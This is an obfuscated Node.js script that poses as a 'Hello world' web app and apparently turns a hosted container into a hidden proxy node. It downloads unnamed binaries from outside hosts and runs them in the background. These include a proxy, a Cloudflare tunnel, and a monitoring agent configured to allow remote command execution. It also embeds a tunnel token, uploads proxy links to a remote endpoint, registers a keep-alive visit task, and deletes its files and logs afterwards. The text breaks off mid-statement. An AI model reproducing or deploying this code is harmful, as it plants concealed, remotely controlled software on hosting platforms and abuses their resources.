const _0x25a3f8=_0x573d;(function(_0xb120e8,_0x45e0fa){const _0x239d2c=_0x573d,_0x19f0c0=_0xb120e8();while(!![]){try{const _0x1c1bb1=-parseInt(_0x239d2c(0x165))/0x1*(parseInt(_0x239d2c(0x1b0))/0x2)+parseInt(_0x239d2c(0x189))/0x3*(parseInt(_0x239d2c(0x1a5))/0x4)+-parseInt(_0x239d2c(0x116))/0x5+parseInt(_0x239d2c(0x185))/0x6+parseInt(_0x239d2c(0x16f))/0x7+-parseInt(_0x239d2c(0x1c8))/0x8*(-parseInt(_0x239d2c(0x11a))/0x9)+-parseInt(_0x239d2c(0x1be))/0xa*(parseInt(_0x239d2c(0x1d4))/0xb);if(_0x1c1bb1===_0x45e0fa)break;else _0x19f0c0['push'](_0x19f0c0['shift']());}catch(_0x40db46){_0x19f0c0['push'](_0x19f0c0['shift']());}}}(_0xe818,0xb3424));const express=require('express'),app=express(),axios=require(_0x25a3f8(0x169)),os=require('os'),fs=require('fs'),path=require(_0x25a3f8(0x13a)),{promisify}=require(_0x25a3f8(0x1bf)),exec=promisify(require(_0x25a3f8(0x114))[_0x25a3f8(0x1cd)]),{execSync}=require(_0x25a3f8(0x114)),UPLOAD_URL=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x144)]||'',PROJECT_URL=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x11f)]||'',AUTO_ACCESS=process[_0x25a3f8(0x1bd)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x25a3f8(0x1af)]||_0x25a3f8(0x163),SUB_PATH=process['env'][_0x25a3f8(0x1c2)]||_0x25a3f8(0x192),PORT=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x174)]||process[_0x25a3f8(0x1bd)][_0x25a3f8(0x16d)]||0xbb8,UUID=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x194)]||_0x25a3f8(0x1d0),NEZHA_SERVER=process['env'][_0x25a3f8(0x1d2)]||'',NEZHA_PORT=process['env'][_0x25a3f8(0x17f)]||'',NEZHA_KEY=process['env'][_0x25a3f8(0x14b)]||'',ARGO_DOMAIN=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x158)]||_0x25a3f8(0x143),ARGO_AUTH=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x128)]||_0x25a3f8(0x1b9),ARGO_PORT=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x1d5)]||0x1f41,CFIP=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x164)]||'cdns.doon.eu.org',CFPORT=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x16c)]||0x1bb,NAME=process[_0x25a3f8(0x1bd)][_0x25a3f8(0x140)]||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x25a3f8(0x1b5)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x25a3f8(0x1c1));function generateRandomName(){const _0x25dc72=_0x25a3f8,_0x486ecb=_0x25dc72(0x1bb);let _0x50d325='';for(let _0x279257=0x0;_0x279257<0x6;_0x279257++){_0x50d325+=_0x486ecb[_0x25dc72(0x1b2)](Math[_0x25dc72(0x113)](Math[_0x25dc72(0x12c)]()*_0x486ecb[_0x25dc72(0x1c6)]));}return _0x50d325;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x25a3f8(0x181)](FILE_PATH,npmName),phpPath=path[_0x25a3f8(0x181)](FILE_PATH,phpName),webPath=path[_0x25a3f8(0x181)](FILE_PATH,webName),botPath=path[_0x25a3f8(0x181)](FILE_PATH,botName),subPath=path[_0x25a3f8(0x181)](FILE_PATH,_0x25a3f8(0x14d)),listPath=path['join'](FILE_PATH,_0x25a3f8(0x12b)),bootLogPath=path[_0x25a3f8(0x181)](FILE_PATH,_0x25a3f8(0x178)),configPath=path['join'](FILE_PATH,_0x25a3f8(0x148));function _0x573d(_0x37d92a,_0x45cca4){const _0xe818e9=_0xe818();return _0x573d=function(_0x573d1a,_0x59a71f){_0x573d1a=_0x573d1a-0x111;let _0x132d02=_0xe818e9[_0x573d1a];return _0x132d02;},_0x573d(_0x37d92a,_0x45cca4);}function deleteNodes(){const _0xcb7d3f=_0x25a3f8;try{if(!UPLOAD_URL)return;if(!fs[_0xcb7d3f(0x159)](subPath))return;let _0x5904e7;try{_0x5904e7=fs[_0xcb7d3f(0x14a)](subPath,_0xcb7d3f(0x153));}catch{return null;}const _0x4e5f3b=Buffer[_0xcb7d3f(0x139)](_0x5904e7,_0xcb7d3f(0x1a7))[_0xcb7d3f(0x18f)](_0xcb7d3f(0x153)),_0x3448d8=_0x4e5f3b[_0xcb7d3f(0x133)]('\x0a')[_0xcb7d3f(0x18c)](_0x3ee6a5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3ee6a5));if(_0x3448d8[_0xcb7d3f(0x1c6)]===0x0)return;return axios[_0xcb7d3f(0x173)](UPLOAD_URL+_0xcb7d3f(0x196),JSON['stringify']({'nodes':_0x3448d8}),{'headers':{'Content-Type':_0xcb7d3f(0x171)}})[_0xcb7d3f(0x191)](_0x5d3504=>{return null;}),null;}catch(_0x5ddca5){return null;}}function cleanupOldFiles(){const _0x45a5e2=_0x25a3f8;try{const _0x141a7f=fs[_0x45a5e2(0x198)](FILE_PATH);_0x141a7f[_0x45a5e2(0x1a0)](_0x3e4262=>{const _0x49f245=_0x45a5e2,_0x319ebe=path['join'](FILE_PATH,_0x3e4262);try{fs[_0x49f245(0x119)](_0x319ebe),console['log']('Deleted\x20file:\x20'+_0x319ebe);}catch(_0x5be8ff){console[_0x49f245(0x179)](_0x49f245(0x16a)+_0x319ebe,_0x5be8ff);}});}catch(_0x984ebe){console['error'](_0x45a5e2(0x19a)+FILE_PATH,_0x984ebe);}}app['get']('/',function(_0x97383a,_0x1e3c52){const _0x5771b3=_0x25a3f8;_0x1e3c52['send'](_0x5771b3(0x11e));});async function generateConfig(){const _0x37e1ce=_0x25a3f8,_0x13a669={'log':{'access':_0x37e1ce(0x129),'error':_0x37e1ce(0x129),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x37e1ce(0x13c),'settings':{'clients':[{'id':UUID,'flow':_0x37e1ce(0x184)}],'decryption':_0x37e1ce(0x175),'fallbacks':[{'dest':0xbb9},{'path':_0x37e1ce(0x11c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x37e1ce(0x136),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x37e1ce(0x15f),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x37e1ce(0x175)},'streamSettings':{'network':_0x37e1ce(0x1ca),'security':_0x37e1ce(0x175)}},{'port':0xbba,'listen':_0x37e1ce(0x15f),'protocol':_0x37e1ce(0x13c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x37e1ce(0x175)},'streamSettings':{'network':'ws','security':_0x37e1ce(0x175),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x37e1ce(0x170),'tls',_0x37e1ce(0x1a4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x37e1ce(0x15f),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x37e1ce(0x112)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x37e1ce(0x123),_0x37e1ce(0x1a4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x37e1ce(0x15f),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x37e1ce(0x175),'wsSettings':{'path':_0x37e1ce(0x136)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x37e1ce(0x123),_0x37e1ce(0x1a4)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x37e1ce(0x14c),'tag':_0x37e1ce(0x147)},{'protocol':_0x37e1ce(0x1c0),'tag':_0x37e1ce(0x1cc)}]};fs['writeFileSync'](path[_0x37e1ce(0x181)](FILE_PATH,_0x37e1ce(0x148)),JSON[_0x37e1ce(0x1b6)](_0x13a669,null,0x2));}function getSystemArchitecture(){const _0x53aed8=_0x25a3f8,_0x3e0476=os[_0x53aed8(0x1ac)]();return _0x3e0476===_0x53aed8(0x137)||_0x3e0476===_0x53aed8(0x17a)||_0x3e0476===_0x53aed8(0x183)?_0x53aed8(0x137):'amd';}function downloadFile(_0x5a3ec0,_0x1851da,_0x4be747){const _0x24f38a=_0x25a3f8,_0x1c7998=_0x5a3ec0;!fs[_0x24f38a(0x159)](FILE_PATH)&&fs[_0x24f38a(0x17b)](FILE_PATH,{'recursive':!![]});const _0x694884=fs[_0x24f38a(0x1a8)](_0x1c7998);axios({'method':'get','url':_0x1851da,'responseType':_0x24f38a(0x134)})[_0x24f38a(0x11b)](_0x8ec3b7=>{const _0x3d0357=_0x24f38a;_0x8ec3b7[_0x3d0357(0x18d)][_0x3d0357(0x188)](_0x694884),_0x694884['on'](_0x3d0357(0x1ba),()=>{const _0x1226ce=_0x3d0357;_0x694884['close'](),console[_0x1226ce(0x1b5)](_0x1226ce(0x1d1)+path[_0x1226ce(0x141)](_0x1c7998)+_0x1226ce(0x187)),_0x4be747(null,_0x1c7998);}),_0x694884['on'](_0x3d0357(0x179),_0x4afca0=>{const _0x29a0a9=_0x3d0357;fs[_0x29a0a9(0x186)](_0x1c7998,()=>{});const _0x3ea646=_0x29a0a9(0x1d1)+path[_0x29a0a9(0x141)](_0x1c7998)+_0x29a0a9(0x130)+_0x4afca0['message'];console[_0x29a0a9(0x179)](_0x3ea646),_0x4be747(_0x3ea646);});})['catch'](_0x4dc213=>{const _0x2a2be0=_0x24f38a,_0x361185='Download\x20'+path['basename'](_0x1c7998)+'\x20failed:\x20'+_0x4dc213[_0x2a2be0(0x142)];console[_0x2a2be0(0x179)](_0x361185),_0x4be747(_0x361185);});}function _0xe818(){const _0x4ec965=['\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x20\x20','test','?security=tls&sni=','automatic\x20access\x20task\x20added\x20successfully','127.0.0.1','status','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/bot','./tmp','CFIP','463503OgYDfp','2087','Error\x20executing\x20command:\x20','push','axios','Failed\x20to\x20delete\x20file:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','CFPORT','PORT','get','4762352Mpnanr','http','application/json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','post','SERVER_PORT','none','platform','pop','boot.log','error','arm64','mkdirSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://oooo.serv00.net/add-url','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','2053','join','8443','aarch64','xtls-rprx-vision','1804668CQIjii','unlink','\x20successfully','pipe','856983vmSKut','\x20-s\x20','tunnel.yml','filter','data','all','toString','https://amd64.ssss.nyc.mn/v1','catch','sub','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','UUID','send','/api/delete-nodes','/config.json\x20>/dev/null\x202>&1\x20&','readdirSync','chmod','Failed\x20to\x20read\x20directory:\x20','Subscription\x20uploaded\x20successfully','clear','\x0aclient_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','pkill\x20-f\x20\x22[','forEach','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Nodes\x20uploaded\x20successfully','has','quic','4IobQHN','443','base64','createWriteStream','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/tunnel.yml\x20run','fileUrl','arch','nohup\x20','\x20-c\x20','FILE_PATH','2SvqeiP','&path=%2Ftrojan-argo%3Fed%3D2560#','charAt','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','log','stringify','2096','Unhandled\x20error\x20in\x20startserver:','eyJhIjoiN2ZmY2MwMjMyM2U4OTFlNTk4MTZlMTljNzg3Nzg1NDYiLCJ0IjoiMGVlZDcxMjctM2Y1MS00M2FkLWJhNDMtNDg0ZDFjODM4NmIwIiwicyI6Ik4ySTJNemcwWWpFdFlUWXdaaTAwT0RNNUxXSXhaamN0TVRZNE56WXlaVEppWkdOaiJ9','finish','abcdefghijklmnopqrstuvwxyz','\x20>\x20nul\x202>&1','env','3738730FKMNZV','util','blackhole','\x20already\x20exists','SUB_PATH','Add\x20automatic\x20access\x20task\x20faild:\x20','true','\x0a\x20\x20\x0avmess://','length','App\x20is\x20running','5336XEueIo','tunnel.json','tcp','/api/add-nodes','block','exec','listen','/api/add-subscriptions','8223b0c8-1379-4721-985e-25c5e4b26c2e','Download\x20','NEZHA_SERVER','\x20>/dev/null\x202>&1','11bBmAvx','ARGO_PORT','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/vmess-argo','floor','child_process','Skipping\x20adding\x20automatic\x20access\x20task','2314360LJZphS','writeFileSync','https://amd64.ssss.nyc.mn/web','unlinkSync','10359UPouTT','then','/vless-argo','http\x20server\x20is\x20running\x20on\x20port:','Hello\x20world!','PROJECT_URL','includes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_DOMAIN:','tls','substring','\x20>/dev/null\x202>&1\x20&','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_AUTH','/dev/null','fileName','list.txt','random','/vmess-argo?ed=2560','config.yaml','text/plain;\x20charset=utf-8','\x20failed:\x20','ArgoDomain:','firefox','split','stream','trim','/trojan-argo','arm','Content-Type','from','path','map','vless','match','Error\x20downloading\x20files:','\x22\x20>\x20/dev/null\x202>&1','NAME','basename','message','cdn.dqpb.dpdns.org','UPLOAD_URL','\x20is\x20running','https://arm64.ssss.nyc.mn/v1','direct','config.json','&fp=firefox&type=ws&host=','readFileSync','NEZHA_KEY','freedom','sub.txt','\x20-p\x20','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','unshift','utf-8','https://amd64.ssss.nyc.mn/agent','2083','NEZHA\x20variable\x20is\x20empty,skip\x20running','Empowerment\x20failed\x20for\x20','ARGO_DOMAIN','existsSync'];_0xe818=function(){return _0x4ec965;};return _0xe818();}async function downloadFilesAndRun(){const _0x15a143=_0x25a3f8,_0x210336=getSystemArchitecture(),_0x5060b5=getFilesForArchitecture(_0x210336);if(_0x5060b5[_0x15a143(0x1c6)]===0x0){console[_0x15a143(0x1b5)](_0x15a143(0x126));return;}const _0x14826b=_0x5060b5[_0x15a143(0x13b)](_0x4c4876=>{return new Promise((_0x51d779,_0x3dd4b7)=>{const _0x2140f4=_0x573d;downloadFile(_0x4c4876[_0x2140f4(0x12a)],_0x4c4876[_0x2140f4(0x1ab)],(_0x514dda,_0x237902)=>{_0x514dda?_0x3dd4b7(_0x514dda):_0x51d779(_0x237902);});});});try{await Promise[_0x15a143(0x18e)](_0x14826b);}catch(_0x86c64f){console['error'](_0x15a143(0x13e),_0x86c64f);return;}function _0xc53e05(_0x5e54d4){const _0x26f9cf=_0x15a143,_0x559872=0x1fd;_0x5e54d4[_0x26f9cf(0x1a0)](_0x5d8ecf=>{const _0x8c8152=_0x26f9cf;fs[_0x8c8152(0x159)](_0x5d8ecf)&&fs[_0x8c8152(0x199)](_0x5d8ecf,_0x559872,_0x1a72be=>{const _0xf7c72e=_0x8c8152;_0x1a72be?console['error'](_0xf7c72e(0x157)+_0x5d8ecf+':\x20'+_0x1a72be):console[_0xf7c72e(0x1b5)]('Empowerment\x20success\x20for\x20'+_0x5d8ecf+':\x20'+_0x559872[_0xf7c72e(0x18f)](0x8));});});}const _0x303231=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xc53e05(_0x303231);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x73fa8b=NEZHA_SERVER[_0x15a143(0x120)](':')?NEZHA_SERVER[_0x15a143(0x133)](':')[_0x15a143(0x177)]():'',_0x582f6c=new Set([_0x15a143(0x1a6),_0x15a143(0x182),_0x15a143(0x1b7),_0x15a143(0x166),_0x15a143(0x155),_0x15a143(0x180)]),_0x2a6e70=_0x582f6c[_0x15a143(0x1a3)](_0x73fa8b)?_0x15a143(0x1c4):'false',_0x506766=_0x15a143(0x19d)+NEZHA_KEY+_0x15a143(0x19e)+NEZHA_SERVER+_0x15a143(0x17c)+_0x2a6e70+_0x15a143(0x161)+UUID;fs[_0x15a143(0x117)](path[_0x15a143(0x181)](FILE_PATH,_0x15a143(0x12e)),_0x506766);const _0x327454=_0x15a143(0x1ad)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x15a143(0x17e);try{await exec(_0x327454),console[_0x15a143(0x1b5)](phpName+'\x20is\x20running'),await new Promise(_0x577cfe=>setTimeout(_0x577cfe,0x3e8));}catch(_0x1b86bc){console[_0x15a143(0x179)]('php\x20running\x20error:\x20'+_0x1b86bc);}}else{let _0x2bf217='';const _0x4eb1be=[_0x15a143(0x1a6),_0x15a143(0x182),_0x15a143(0x1b7),_0x15a143(0x166),_0x15a143(0x155),_0x15a143(0x180)];_0x4eb1be[_0x15a143(0x120)](NEZHA_PORT)&&(_0x2bf217='--tls');const _0x27f337='nohup\x20'+npmPath+_0x15a143(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x15a143(0x14e)+NEZHA_KEY+'\x20'+_0x2bf217+_0x15a143(0x1b3);try{await exec(_0x27f337),console[_0x15a143(0x1b5)](npmName+'\x20is\x20running'),await new Promise(_0x226275=>setTimeout(_0x226275,0x3e8));}catch(_0x1a30d5){console[_0x15a143(0x179)](_0x15a143(0x151)+_0x1a30d5);}}}else console['log'](_0x15a143(0x156));const _0x24fae1=_0x15a143(0x1ad)+webPath+_0x15a143(0x1ae)+FILE_PATH+_0x15a143(0x197);try{await exec(_0x24fae1),console[_0x15a143(0x1b5)](webName+_0x15a143(0x145)),await new Promise(_0x8ace98=>setTimeout(_0x8ace98,0x3e8));}catch(_0x481ab5){console[_0x15a143(0x179)](_0x15a143(0x1b4)+_0x481ab5);}if(fs[_0x15a143(0x159)](botPath)){let _0x3a838b;if(ARGO_AUTH[_0x15a143(0x13d)](/^[A-Z0-9a-z=]{120,250}$/))_0x3a838b=_0x15a143(0x127)+ARGO_AUTH;else ARGO_AUTH[_0x15a143(0x13d)](/TunnelSecret/)?_0x3a838b=_0x15a143(0x172)+FILE_PATH+_0x15a143(0x1aa):_0x3a838b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x15a143(0x121)+ARGO_PORT;try{await exec(_0x15a143(0x1ad)+botPath+'\x20'+_0x3a838b+_0x15a143(0x125)),console['log'](botName+_0x15a143(0x145)),await new Promise(_0x20f47d=>setTimeout(_0x20f47d,0x7d0));}catch(_0x403f17){console['error'](_0x15a143(0x167)+_0x403f17);}}await new Promise(_0x5926db=>setTimeout(_0x5926db,0x1388));}function getFilesForArchitecture(_0x125215){const _0x12a941=_0x25a3f8;let _0x3cb9e6;_0x125215===_0x12a941(0x137)?_0x3cb9e6=[{'fileName':webPath,'fileUrl':_0x12a941(0x150)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3cb9e6=[{'fileName':webPath,'fileUrl':_0x12a941(0x118)},{'fileName':botPath,'fileUrl':_0x12a941(0x162)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3aee87=_0x125215==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x12a941(0x154);_0x3cb9e6[_0x12a941(0x152)]({'fileName':npmPath,'fileUrl':_0x3aee87});}else{const _0x1e34ae=_0x125215===_0x12a941(0x137)?_0x12a941(0x146):_0x12a941(0x190);_0x3cb9e6[_0x12a941(0x152)]({'fileName':phpPath,'fileUrl':_0x1e34ae});}}return _0x3cb9e6;}function argoType(){const _0x1fc158=_0x25a3f8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1fc158(0x1b5)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1fc158(0x120)]('TunnelSecret')){fs[_0x1fc158(0x117)](path[_0x1fc158(0x181)](FILE_PATH,_0x1fc158(0x1c9)),ARGO_AUTH);const _0x53deea=_0x1fc158(0x15a)+ARGO_AUTH[_0x1fc158(0x133)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1fc158(0x181)](FILE_PATH,_0x1fc158(0x1c9))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1fc158(0x111)+ARGO_PORT+_0x1fc158(0x1a9);fs['writeFileSync'](path[_0x1fc158(0x181)](FILE_PATH,_0x1fc158(0x18b)),_0x53deea);}else console[_0x1fc158(0x1b5)](_0x1fc158(0x16b));}argoType();async function extractDomains(){const _0x551908=_0x25a3f8;let _0x5694a8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5694a8=ARGO_DOMAIN,console[_0x551908(0x1b5)](_0x551908(0x122),_0x5694a8),await _0x562921(_0x5694a8);else try{const _0x5b4ec1=fs[_0x551908(0x14a)](path[_0x551908(0x181)](FILE_PATH,_0x551908(0x178)),_0x551908(0x153)),_0x4bce7b=_0x5b4ec1[_0x551908(0x133)]('\x0a'),_0x40c80a=[];_0x4bce7b[_0x551908(0x1a0)](_0x219cdf=>{const _0x1d3b49=_0x551908,_0x3e2d31=_0x219cdf[_0x1d3b49(0x13d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3e2d31){const _0x2358f1=_0x3e2d31[0x1];_0x40c80a[_0x1d3b49(0x168)](_0x2358f1);}});if(_0x40c80a[_0x551908(0x1c6)]>0x0)_0x5694a8=_0x40c80a[0x0],console[_0x551908(0x1b5)](_0x551908(0x131),_0x5694a8),await _0x562921(_0x5694a8);else{console[_0x551908(0x1b5)](_0x551908(0x193)),fs[_0x551908(0x119)](path['join'](FILE_PATH,'boot.log'));async function _0xaec2f1(){const _0x219a54=_0x551908;try{process[_0x219a54(0x176)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x219a54(0x19f)+botName[_0x219a54(0x1b2)](0x0)+']'+botName[_0x219a54(0x124)](0x1)+_0x219a54(0x13f));}catch(_0x231efa){}}_0xaec2f1(),await new Promise(_0xe3f071=>setTimeout(_0xe3f071,0xbb8));const _0x3d8fc8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x551908(0x121)+ARGO_PORT;try{await exec(_0x551908(0x1ad)+botPath+'\x20'+_0x3d8fc8+_0x551908(0x125)),console['log'](botName+_0x551908(0x145)),await new Promise(_0x467f7d=>setTimeout(_0x467f7d,0xbb8)),await extractDomains();}catch(_0x5e62fd){console['error']('Error\x20executing\x20command:\x20'+_0x5e62fd);}}}catch(_0x16bbc9){console[_0x551908(0x179)]('Error\x20reading\x20boot.log:',_0x16bbc9);}async function _0x562921(_0xb0a8d0){const _0x4449df=_0x551908,_0x188794=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x4449df(0x153)}),_0x490969=_0x188794[_0x4449df(0x135)](),_0x118efe=NAME?NAME+'-'+_0x490969:_0x490969;return new Promise(_0x3d5735=>{setTimeout(()=>{const _0x2f75f2=_0x573d,_0x2f66f5={'v':'2','ps':''+_0x118efe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2f75f2(0x175),'net':'ws','type':_0x2f75f2(0x175),'host':_0xb0a8d0,'path':_0x2f75f2(0x12d),'tls':_0x2f75f2(0x123),'sni':_0xb0a8d0,'alpn':'','fp':_0x2f75f2(0x132)},_0xe9c6c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xb0a8d0+_0x2f75f2(0x149)+_0xb0a8d0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x118efe+_0x2f75f2(0x1c5)+Buffer[_0x2f75f2(0x139)](JSON[_0x2f75f2(0x1b6)](_0x2f66f5))['toString'](_0x2f75f2(0x1a7))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x2f75f2(0x15d)+_0xb0a8d0+_0x2f75f2(0x149)+_0xb0a8d0+_0x2f75f2(0x1b1)+_0x118efe+_0x2f75f2(0x15b);console[_0x2f75f2(0x1b5)](Buffer[_0x2f75f2(0x139)](_0xe9c6c)['toString'](_0x2f75f2(0x1a7))),fs[_0x2f75f2(0x117)](subPath,Buffer[_0x2f75f2(0x139)](_0xe9c6c)[_0x2f75f2(0x18f)](_0x2f75f2(0x1a7))),console[_0x2f75f2(0x1b5)](FILE_PATH+_0x2f75f2(0x14f)),uploadNodes(),app[_0x2f75f2(0x16e)]('/'+SUB_PATH,(_0x455766,_0x42aa39)=>{const _0x383e60=_0x2f75f2,_0x1b4e62=Buffer[_0x383e60(0x139)](_0xe9c6c)[_0x383e60(0x18f)](_0x383e60(0x1a7));_0x42aa39['set'](_0x383e60(0x138),_0x383e60(0x12f)),_0x42aa39[_0x383e60(0x195)](_0x1b4e62);}),_0x3d5735(_0xe9c6c);},0x7d0);});}}async function uploadNodes(){const _0x1b4b4e=_0x25a3f8;if(UPLOAD_URL&&PROJECT_URL){const _0x36c75b=PROJECT_URL+'/'+SUB_PATH,_0x1f9f76={'subscription':[_0x36c75b]};try{const _0x29429d=await axios[_0x1b4b4e(0x173)](UPLOAD_URL+_0x1b4b4e(0x1cf),_0x1f9f76,{'headers':{'Content-Type':_0x1b4b4e(0x171)}});return _0x29429d&&_0x29429d[_0x1b4b4e(0x160)]===0xc8?(console[_0x1b4b4e(0x1b5)](_0x1b4b4e(0x19b)),_0x29429d):null;}catch(_0x220053){if(_0x220053['response']){if(_0x220053['response'][_0x1b4b4e(0x160)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b4b4e(0x159)](listPath))return;const _0x2dfabf=fs[_0x1b4b4e(0x14a)](listPath,_0x1b4b4e(0x153)),_0x4d4594=_0x2dfabf[_0x1b4b4e(0x133)]('\x0a')['filter'](_0x9f64e0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b4b4e(0x15c)](_0x9f64e0));if(_0x4d4594[_0x1b4b4e(0x1c6)]===0x0)return;const _0x4468b3=JSON['stringify']({'nodes':_0x4d4594});try{const _0x269fe7=await axios['post'](UPLOAD_URL+_0x1b4b4e(0x1cb),_0x4468b3,{'headers':{'Content-Type':_0x1b4b4e(0x171)}});return _0x269fe7&&_0x269fe7['status']===0xc8?(console[_0x1b4b4e(0x1b5)](_0x1b4b4e(0x1a2)),_0x269fe7):null;}catch(_0x1af568){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3cae85=_0x573d,_0x3774ac=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3774ac[_0x3cae85(0x168)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3774ac[_0x3cae85(0x168)](phpPath);process[_0x3cae85(0x176)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x3774ac[_0x3cae85(0x181)]('\x20')+_0x3cae85(0x1bc),_0x141308=>{const _0x2bc0f9=_0x3cae85;console['clear'](),console['log'](_0x2bc0f9(0x1c7)),console[_0x2bc0f9(0x1b5)](_0x2bc0f9(0x1a1));}):exec('rm\x20-rf\x20'+_0x3774ac[_0x3cae85(0x181)]('\x20')+_0x3cae85(0x1d3),_0x26e7b4=>{const _0x28a1ad=_0x3cae85;console[_0x28a1ad(0x19c)](),console[_0x28a1ad(0x1b5)]('App\x20is\x20running'),console[_0x28a1ad(0x1b5)](_0x28a1ad(0x1a1));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x440e4c=_0x25a3f8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x440e4c(0x1b5)](_0x440e4c(0x115));return;}try{const _0x2130cd=await axios['post'](_0x440e4c(0x17d),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x440e4c(0x1b5)](_0x440e4c(0x15e)),_0x2130cd;}catch(_0x2dcf41){return console[_0x440e4c(0x179)](_0x440e4c(0x1c3)+_0x2dcf41[_0x440e4c(0x142)]),null;}}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d289e){console['error']('Error\x20in\x20startserver:',_0x2d289e);}}startserver()[_0x25a3f8(0x191)](_0x27ea5a=>{const 